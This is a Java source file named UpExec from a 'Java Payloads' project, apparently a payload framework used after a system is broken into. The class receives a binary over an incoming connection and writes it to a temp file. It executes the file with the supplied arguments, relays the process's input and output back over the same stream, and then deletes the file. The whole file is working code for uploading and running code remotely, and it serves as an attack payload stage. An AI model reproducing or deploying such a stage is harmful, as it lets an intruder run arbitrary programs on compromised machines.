/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.stage;

import java.io.DataInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStream;

public class UpExec implements Stage {

	public void start(DataInputStream in, OutputStream out, String[] parameters) throws Exception {
		final String tempfile = File.createTempFile("~upexec", null).getAbsolutePath();
		final int length = in.readInt();
		final byte[] data = new byte[length];
		in.readFully(data);
		final FileOutputStream fos = new FileOutputStream(tempfile);
		fos.write(data);
		fos.close();
		for (int i = 0; i < parameters.length; i++) {
			if (parameters[i].equals("--")) {
				// separator found. The next parameter will be the module name, and
				// all remaining parameters are for exec.
				final String[] cmdarray = new String[parameters.length - i - 2];
				System.arraycopy(parameters, i + 2, cmdarray, 0, cmdarray.length);
				cmdarray[0] = tempfile;
				final Process proc = Runtime.getRuntime().exec(cmdarray);
				new StreamForwarder(in, proc.getOutputStream(), out).start();
				StreamForwarder inFwd = new StreamForwarder(proc.getInputStream(), out, out, false);
				StreamForwarder errFwd = new StreamForwarder(proc.getErrorStream(), out, out, false);
				inFwd.start();
				errFwd.start();
				proc.waitFor();
				inFwd.join();
				errFwd.join();
				in.close();
				out.close();
				break;
			}
		}
		new File(tempfile).delete();
	}
}
